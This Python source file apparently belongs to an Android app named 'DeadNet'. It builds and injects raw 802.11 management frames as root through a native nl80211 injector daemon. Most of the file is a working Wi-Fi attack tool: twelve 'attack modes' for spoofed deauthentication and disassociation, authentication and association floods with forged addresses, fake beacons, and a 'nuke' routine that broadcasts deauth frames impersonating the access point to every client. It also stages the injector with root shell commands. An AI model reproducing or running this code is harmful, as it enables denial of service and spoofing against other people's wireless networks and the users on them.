"""
MgmtTx — Android-namespace management-frame transmitter (OP12 port, step 1).

Port of the Debian-container PoC (op12/op12-mgmt-poc.py + op12/nl80211_inject.c
--stdio daemon) into the APK engine so every privileged call stays on-host
under `su` with no chroot / no sudo.

  * Frame bytes are byte-identical to the PoC fr()/ssid_ies()/build_frame()
    so all documented acceptance results still apply (see
    op12/wifi-modem-seams.md FULL surface map).
  * Transport is one persistent `nl80211_inject --stdio` daemon per iface
    (socket + family + mlme membership set up once), driven over stdin/stdout
    with one frame per line. Falls back to one-shot fork on daemon death.
  * Staging mirrors EmissionController: assets/nl80211_inject.<arch> is copied
    into appdir, chmod 777 + chown root, then launched under `su -c`.

Stdlib only. Headless-safe: imports never spawn anything; the self-test runs
on the build box with a fake daemon process (no device, no root).
"""
from __future__ import annotations

import binascii
import os
import platform
import re
import select
import subprocess
import sys
import threading
from dataclasses import dataclass
from typing import Callable, Dict, Optional, Tuple

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

try:
    from kivy.logger import Logger
except Exception:  # off-device / bare test env
    class _L:  # noqa: D101
        def info(self, *a, **k): pass
        def error(self, *a, **k): pass
        def warning(self, *a, **k): pass
    Logger = _L()

DEADNET_PREF = "DeadNet"

BC = "ffffffffffff"
MIN_FRAME_LEN, MAX_FRAME_LEN = 25, 1600  # mgmt body gate / injector frame[] cap
DEFAULT_FREQ = 5745
# A valid locally-administered, non-multicast bogus source — used whenever a
# spoofed SA / client is needed but the operator left the knob blank, so a
# frame is never built with an empty/invalid address.
DEFAULT_FAKE = "020000000001"
DEFAULT_DEAUTH_REASON = 7   # "class-3 frame from nonassociated STA" (common)
DEFAULT_DISASSOC_REASON = 8  # "leaving / deauthenticated"

MAC_RE = re.compile(r"^[0-9a-f]{12}$")
HEX_RE = re.compile(r"^[0-9a-fA-F]*$")

_BINARY_MAP = {
    "x86_64": "x86_64",
    "aarch64": "arm64",
    "armv7l": "arm",
    "arm": "arm",
    "i686": "x86",
    "i386": "x86",
}


def _arch_suffix() -> str:
    arch = _BINARY_MAP.get(platform.machine())
    if not arch:
        raise RuntimeError("unsupported device architecture: %r" % platform.machine())
    return arch


# --------------------------------------------------------------------------
# pure helpers (no I/O — unit-testable off-device)
# --------------------------------------------------------------------------
def norm_mac(s: str) -> str:
    """aa:bb:.. / aabb.. / dashes -> 12 lowercase hex chars, or '' if invalid."""
    if not s:
        return ""
    m = re.sub(r"[^0-9a-fA-F]", "", s).lower()
    return m if MAC_RE.match(m) else ""


def colon_mac(m: str) -> str:
    return ":".join(m[i:i + 2] for i in range(0, 12, 2))


def valid_freq(f) -> bool:
    try:
        return int(f) > 0
    except (TypeError, ValueError):
        return False


def fr(fc: str, da: str, sa: str, bssid: str, body: str) -> str:
    return "%s0000%s%s%s0000%s" % (fc, da, sa, bssid, body)


def _freq_to_chan(mhz) -> int:
    """MHz -> 802.11 channel (for a beacon's DS Parameter Set IE). 0 if unknown.
    Mirrors recon.freq_to_channel (kept local to avoid an import cycle)."""
    try:
        mhz = int(mhz)
    except (TypeError, ValueError):
        return 0
    if mhz == 2484:
        return 14
    if 2412 <= mhz <= 2472:
        return 1 + (mhz - 2412) // 5
    if 5925 <= mhz <= 7125:
        return (mhz - 5950) // 5
    if mhz >= 5000:
        return (mhz - 5000) // 5
    return 0


def ssid_ies(ssid: str) -> str:
    b = (ssid or "").encode("utf-8", "replace")
    return "00%02x%s010882848b960c121824" % (len(b), binascii.hexlify(b).decode())


def check_hexframe(h: str) -> Tuple[bool, str]:
    """Validate a hex frame string. Returns (ok, reason)."""
    hh = re.sub(r"[\s:]", "", h or "").lower()
    if not hh or not HEX_RE.match(hh) or len(hh) % 2:
        return False, "hex frame must be even-length hex"
    try:
        nbytes = len(binascii.unhexlify(hh))
    except binascii.Error:
        return False, "hex frame must be even-length hex"
    if nbytes < MIN_FRAME_LEN:
        return False, "frame too short: %d B (mgmt needs >=%d B)" % (nbytes, MIN_FRAME_LEN)
    if nbytes > MAX_FRAME_LEN:
        return False, "frame too long: %d B (tool cap %d B)" % (nbytes, MAX_FRAME_LEN)
    return True, ""


def parse_daemon_reply(line: str) -> Tuple[bool, bool]:
    """`OK ...` / `ERR ...` -> (accepted, ack_yes). Never raises."""
    try:
        s = (line or "").strip()
        if s.startswith("OK"):
            return True, ("ack=yes" in s)
        return False, False
    except Exception:  # noqa: BLE001
        return False, False


def parse_oneshot_output(out: str) -> Tuple[bool, bool]:
    """One-shot stdout+stderr -> (accepted, ack_yes). Never raises."""
    try:
        o = out or ""
        accepted = ("accepted for TX" in o) or ("ACK (accepted)" in o)
        return accepted, ("ACK=yes" in o)
    except Exception:  # noqa: BLE001
        return False, False


@dataclass
class MgmtTarget:
    mac: str   # 12-char colonless lowercase
    typ: str   # "ap" | "station"
    freq: int  # MHz
    label: str = ""
    ssid: str = ""


@dataclass
class MgmtCtx:
    ap_ctx: str = ""
    assoc_ssid: str = ""      # SSID override for probe/assoc/beacon modes
    fake: str = ""            # spoofed source address (floods / AP->client)
    cli: str = ""             # target client MAC (directed deauth/disassoc)
    custom_hex: str = ""      # raw frame for mode 12
    reason: int = 0           # deauth/disassoc reason code (0 => per-frame default)
    payload: str = ""         # optional action-frame payload override (modes 8-10)


def eff_ssid(tgt_ssid: str, assoc_ssid: str) -> str:
    return tgt_ssid or assoc_ssid or ""


def _reason_body(reason: int, default: int) -> str:
    """2-byte little-endian reason code body for deauth/disassoc."""
    r = default if not reason else int(reason)
    r = 0 if r < 0 else (255 if r > 255 else r)
    return "%02x00" % r


def _fake(ctx: "MgmtCtx") -> str:
    return norm_mac(ctx.fake) or DEFAULT_FAKE


def _cli(ctx: "MgmtCtx") -> str:
    return norm_mac(ctx.cli) or norm_mac(ctx.fake) or DEFAULT_FAKE


def build_frame(mode: int, tgt: MgmtTarget, ctx: MgmtCtx) -> Tuple[str, str]:
    """Return (label, hexframe) for attack mode 1..12.

    Frame bytes match the PoC when the knobs are at their defaults; the knobs
    (reason/cli/fake/ssid/payload/custom_hex on MgmtCtx) only parameterise the
    documented fields. Addresses are always well-formed: blank spoof/client
    knobs fall back to DEFAULT_FAKE so a frame is never built malformed.
    """
    m, t = tgt.mac, tgt.typ
    ap = ctx.ap_ctx or BC
    deauth = _reason_body(ctx.reason, DEFAULT_DEAUTH_REASON)
    disassoc = _reason_body(ctx.reason, DEFAULT_DISASSOC_REASON)
    if mode == 1:
        if t == "ap":
            return ("deauth BCAST from AP (SA=%s DA=bcast)" % m,
                    fr("c000", BC, m, m, deauth))
        return ("deauth AP->STA (SA=%s DA=%s)" % (ap, m),
                fr("c000", m, ap, ap, deauth))
    if mode == 2:
        cli = _cli(ctx)
        if t == "ap":
            return ("deauth AP->client %s (SA=%s)" % (cli, m),
                    fr("c000", cli, m, m, deauth))
        return ("deauth STA->AP (SA=%s DA=%s)" % (m, ap),
                fr("c000", ap, m, ap, deauth))
    if mode == 3:
        if t == "ap":
            return ("disassoc BCAST from AP (SA=%s)" % m,
                    fr("a000", BC, m, m, disassoc))
        return ("disassoc AP->STA (SA=%s DA=%s)" % (ap, m),
                fr("a000", m, ap, ap, disassoc))
    if mode == 4:
        cli = _cli(ctx)
        if t == "ap":
            return ("disassoc AP->client %s (SA=%s)" % (cli, m),
                    fr("a000", cli, m, m, disassoc))
        return ("disassoc STA->AP (SA=%s DA=%s)" % (m, ap),
                fr("a000", ap, m, ap, disassoc))
    if mode == 5:
        s = eff_ssid(tgt.ssid, ctx.assoc_ssid)
        sa = _fake(ctx) if t == "ap" else m
        return ('probe-req flood SSID="%s" (SA=%s)' % (s, sa),
                fr("4000", BC, sa, BC, ssid_ies(s)))
    if mode == 6:
        sa, da = (_fake(ctx), m) if t == "ap" else (m, ap)
        return ("auth flood as %s -> %s" % (sa, da),
                fr("b000", da, sa, da, "000000010000"))
    if mode == 7:
        s = eff_ssid(tgt.ssid, ctx.assoc_ssid)
        sa, da = (_fake(ctx), m) if t == "ap" else (m, ap)
        return ('assoc-req flood as %s -> %s SSID="%s"' % (sa, da, s),
                fr("0000", da, sa, da, "04010a00" + ssid_ies(s)))
    if mode == 8:
        body = _action_payload(ctx.payload, "0409deadbeef4f503132504f43")
        return (("public action cat=04 -> %s" % m), fr("d000", m, m, m, body))
    if mode == 9:
        body = _action_payload(ctx.payload, "7fdeadbeef4f503132504f43")
        return (("vendor action cat=7f OP12POC -> %s" % m), fr("d000", m, m, m, body))
    if mode == 10:
        body = _action_payload(ctx.payload, "0000000000")
        return (("non-public action cat=00 -> %s" % m), fr("d000", m, m, m, body))
    if mode == 11:
        s = eff_ssid(tgt.ssid, ctx.assoc_ssid)
        # timestamp(8) | beacon interval 100 TU | capability ESS | SSID+rates | DS(chan)
        ch = _freq_to_chan(tgt.freq)
        ds = ("0301%02x" % ch) if 0 < ch < 256 else ""
        body = "0000000000000000" + "6400" + "0100" + ssid_ies(s) + ds
        if t == "ap":
            return (('beacon (BSSID=%s SSID="%s" ch%d)' % (m, s, ch)),
                    fr("8000", BC, m, m, body))
        return (("probe-resp -> bcast BSSID=%s" % ap),
                fr("5000", BC, m, ap, body))
    if mode == 12:
        return ("custom frame", re.sub(r"[\s:]", "", ctx.custom_hex or "").lower())
    return ("deauth BCAST from AP (SA=%s DA=bcast)" % m,
            fr("c000", BC, m, m, deauth))


def _action_payload(payload: str, default: str) -> str:
    """Sanitised action-frame body override, else the default payload."""
    p = re.sub(r"[\s:]", "", payload or "").lower()
    return p if (p and HEX_RE.match(p) and len(p) % 2 == 0) else default


def bld_nuke(mac: str, tog: int, reason: int = 0) -> str:
    """Broadcast deauth/disassoc spoofed AS the AP (SA=BSSID, DA=broadcast) so
    every client honours it (NUKE rotation flips the two per frame)."""
    if tog == 0:
        return fr("c000", BC, mac, mac, _reason_body(reason, DEFAULT_DEAUTH_REASON))
    return fr("a000", BC, mac, mac, _reason_body(reason, DEFAULT_DISASSOC_REASON))


# --------------------------------------------------------------------------
# transport: one persistent --stdio daemon per iface + one-shot fallback
# --------------------------------------------------------------------------
PopenFactory = Callable[..., object]


class DaemonInjector:
    """One --stdio child per iface: socket/family/membership set up once, then
    one frame per stdin line. Restarts transparently on death; raises on
    transport failure so the caller can fall back to one-shot."""

    def __init__(self, path: str, iface: str, wait: int = 2,
                 popen: Optional[PopenFactory] = None):
        self.path = path
        self.iface = iface
        self.wait = wait
        self._popen = popen or subprocess.Popen
        self.lock = threading.Lock()
        self.proc = None
        self._start()

    def _start(self):
        self._stop()
        try:
            self.proc = self._popen(
                ["su", "-c", "%s --stdio --wait %s %s" % (self.path, self.wait, self.iface)],
                stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL, text=True, bufsize=1,
                start_new_session=True)
        except Exception:  # noqa: BLE001
            Logger.error(f"{DEADNET_PREF}: mgmt daemon spawn failed")
            self.proc = None

    def _stop(self):
        p, self.proc = self.proc, None
        if p is None:
            return
        try:
            if getattr(p, "stdin", None):
                p.stdin.close()
        except Exception:  # noqa: BLE001
            pass
        try:
            p.wait(timeout=2)
        except Exception:  # noqa: BLE001
            try:
                p.kill()
            except Exception:  # noqa: BLE001
                pass

    def alive(self) -> bool:
        try:
            return self.proc is not None and self.proc.poll() is None
        except Exception:  # noqa: BLE001
            return False

    def send(self, freq: int, hexframe: str, fast: bool = False) -> Tuple[bool, bool]:
        with self.lock:
            if not self.alive():
                self._start()
            if not self.alive():
                raise RuntimeError("injector daemon unavailable")
            try:
                self.proc.stdin.write("%s %s %s\n"
                                      % ("fast" if fast else "full", freq, hexframe or ""))
                self.proc.stdin.flush()
            except Exception as exc:  # noqa: BLE001
                raise RuntimeError("daemon write failed: %s" % exc)
            try:
                fd = self.proc.stdout.fileno()
                r, _, _ = select.select([fd], [], [], self.wait + 8)
            except Exception as exc:  # noqa: BLE001
                raise RuntimeError("daemon poll failed: %s" % exc)
            if not r:
                raise RuntimeError("daemon reply timeout")
            try:
                line = self.proc.stdout.readline()
            except Exception as exc:  # noqa: BLE001
                raise RuntimeError("daemon read failed: %s" % exc)
            if not line:
                raise RuntimeError("daemon EOF")
            return parse_daemon_reply(line)

    def interrupt(self):
        """Hard-kill the child WITHOUT taking the send lock, so a send() blocked
        in select()/readline() unblocks at once (it then raises and the caller
        falls back / stops). Safe to call from another thread; the daemon
        re-spawns lazily on the next send."""
        p = self.proc
        if p is not None:
            try:
                p.kill()
            except Exception:  # noqa: BLE001
                pass

    def close(self):
        with self.lock:
            self._stop()


class MgmtTxController:
    """Stages the native injector and transmits mgmt frames from Android ns.

    Usage:
      tx = MgmtTxController(appdir)
      tx.stage()                      # copy + chmod (root, idempotent)
      ok, ack = tx.send("wlan0", 5745, hexframe, fast=True)
      tx.close()
    """

    def __init__(self, appdir: str, wait: int = 2,
                 popen: Optional[PopenFactory] = None):
        self.appdir = appdir
        self.wait = wait
        self._popen = popen
        self.daemons: Dict[str, DaemonInjector] = {}
        self.injector_path: Optional[str] = None
        self.sap = None          # optional SapController for unassociated SAP injection
        self.sap_iface: Optional[str] = None

    def staged_src(self) -> str:
        here = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        return os.path.join(here, "assets", "nl80211_inject.%s" % _arch_suffix())

    def staged_dst(self) -> str:
        return os.path.join(self.appdir, "nl80211_inject.%s" % _arch_suffix())

    def stage(self) -> Optional[str]:
        """Copy injector into appdir (root-owned, +x). Returns path or None."""
        from engine import rootshell
        src, dst = self.staged_src(), self.staged_dst()
        rc, out = rootshell.su_rc(f"cp -rf {src} {dst} && chmod 777 {dst} && chown root {dst}")
        if rc != 0:
            Logger.error(f"{DEADNET_PREF}: mgmt injector stage failed rc={rc} {out!r}")
            return None
        self.injector_path = dst
        return dst

    def enable_sap(self, channel: int, iface: Optional[str] = None) -> bool:
        """Bring up a SoftAP channel-context for unassociated injection."""
        from engine.sap import SapController
        if self.sap is None:
            self.sap = SapController(iface=iface or self.sap_iface or "wlan0",
                                     appdir=self.appdir)
        self.sap_iface = self.sap.iface
        return self.sap.start(channel)

    def disable_sap(self) -> None:
        if self.sap is not None:
            try:
                self.sap.stop()
            except Exception:  # noqa: BLE001
                pass
            self.sap = None

    def sap_active(self) -> bool:
        return self.sap is not None and self.sap.is_active()

    def send(self, iface: str, freq: int, hexframe: str,
             fast: bool = False) -> Tuple[bool, bool]:
        if self.sap_active():
            try:
                return self.sap.send(hexframe)  # type: ignore[union-attr]
            except Exception:  # noqa: BLE001
                pass
        """Transmit one frame. Prefers the daemon; falls back to one-shot."""
        if self.injector_path and not self._popen:
            d = self.daemons.get(iface)
            if d is None:
                d = DaemonInjector(self.injector_path, iface, self.wait)
                self.daemons[iface] = d
            try:
                return d.send(freq, hexframe, fast)
            except Exception:  # noqa: BLE001
                try:
                    d.close()
                except Exception:  # noqa: BLE001
                    pass
                self.daemons.pop(iface, None)
        return self.oneshot(iface, freq, hexframe, fast)

    def oneshot(self, iface: str, freq: int, hexframe: str,
                fast: bool = False) -> Tuple[bool, bool]:
        from engine import rootshell
        path = self.injector_path or self.staged_dst()
        cmd = "%s %s %s %s %s" % (path, "--fast " if fast else "", iface, freq, hexframe)
        _, out = rootshell.su_rc(cmd.strip(), timeout=15)
        return parse_oneshot_output(out)

    def interrupt(self):
        """Unblock any in-flight send() at once (STOP responsiveness). Does not
        tear the daemons down — they re-spawn lazily on the next send."""
        for d in list(self.daemons.values()):
            try:
                d.interrupt()
            except Exception:  # noqa: BLE001
                pass

    def close(self):
        self.disable_sap()
        for d in list(self.daemons.values()):
            try:
                d.close()
            except Exception:  # noqa: BLE001
                pass
        self.daemons.clear()


# --------------------------------------------------------------------------
# Self-test (no device / no root; does NOT launch the injector).
#   cd apk && python3 engine/mgmt_tx.py
# --------------------------------------------------------------------------
def _selftest() -> None:
    fails = []

    def check(name: str, cond: bool):
        print(("PASS " if cond else "FAIL ") + name)
        if not cond:
            fails.append(name)

    check("fr/deauth-bcast",
          fr("c000", BC, "aabbccddeeff", "aabbccddeeff", "0700") ==
          "c0000000ffffffffffffaabbccddeeffaabbccddeeff00000700")
    check("ssid_ies",
          ssid_ies("test_ap_1") == "0009" + binascii.hexlify(b"test_ap_1").decode()
          + "010882848b960c121824")
    check("norm_mac colon", norm_mac("AA:BB:CC:DD:EE:FF") == "aabbccddeeff")
    check("norm_mac bad", norm_mac("zz") == "")
    check("check_hex short", check_hexframe("d000" + "00" * 10)[0] is False)
    check("check_hex ok", check_hexframe("d000" + "00" * 23)[0] is True)
    check("parse OK ack", parse_daemon_reply("OK cookie=0x1 ack=yes") == (True, True))
    check("parse OK fast", parse_daemon_reply("OK cookie=0x1 fast") == (True, False))
    check("parse ERR", parse_daemon_reply("ERR rejected e22") == (False, False))
    check("parse oneshot", parse_oneshot_output("RESULT: accepted for TX, cookie reply\nTXSTATUS: ACK=yes") == (True, True))

    ctx = MgmtCtx(ap_ctx="", assoc_ssid="s", fake="0a0000000000")
    tgt = MgmtTarget("aabbccddeeff", "ap", 5745, "x", "")
    for m in range(1, 13):
        c = MgmtCtx(ap_ctx="", assoc_ssid="s", fake="0a0000000000",
                    custom_hex="d000" + "00" * 23)
        try:
            _, hx = build_frame(m, tgt, c)
            nb = len(binascii.unhexlify(hx))
            ok = MIN_FRAME_LEN <= nb <= MAX_FRAME_LEN and len(hx) % 2 == 0
        except Exception:  # noqa: BLE001
            ok = False
        check("build mode %d" % m, ok)
    check("bld_nuke tog", bld_nuke("aabbccddeeff", 0) != bld_nuke("aabbccddeeff", 1))

    # daemon protocol against a fake proc (no su, no device)
    class _FakeStdout:
        def __init__(self, lines):
            self.lines = list(lines)
        def fileno(self):
            return 99
        def readline(self):
            return self.lines.pop(0) if self.lines else ""

    class _FakeStdin:
        def __init__(self):
            self.written = ""
        def write(self, s):
            self.written += s
        def flush(self):
            pass
        def close(self):
            pass

    class _FakeProc:
        def __init__(self, lines):
            self.stdin = _FakeStdin()
            self.stdout = _FakeStdout(lines)
        def poll(self):
            return None
        def wait(self, timeout=None):
            return 0
        def kill(self):
            pass

    made = {}
    def _fake_popen(cmd, **k):
        p = _FakeProc(["OK cookie=0xabc ack=yes\n"])
        made["cmd"] = cmd
        made["proc"] = p
        return p

    orig_select = select.select
    select.select = lambda r, w, x, t=None: (r, [], [])
    try:
        d = DaemonInjector("/tmp/nl80211_inject", "wlan0", popen=_fake_popen)
        ok, ack = d.send(5745, "d000" + "00" * 23, fast=False)
        check("daemon send", ok is True and ack is True)
        check("daemon line", made["proc"].stdin.written.startswith("full 5745 d000"))
        check("daemon su cmd", made["cmd"][0] == "su")
        d.close()
    finally:
        select.select = orig_select

    print("---")
    if fails:
        print("MGMT_TX: %d FAILURES: %s" % (len(fails), fails))
        raise SystemExit(1)
    print("MGMT_TX PASS")


if __name__ == "__main__":
    _selftest()
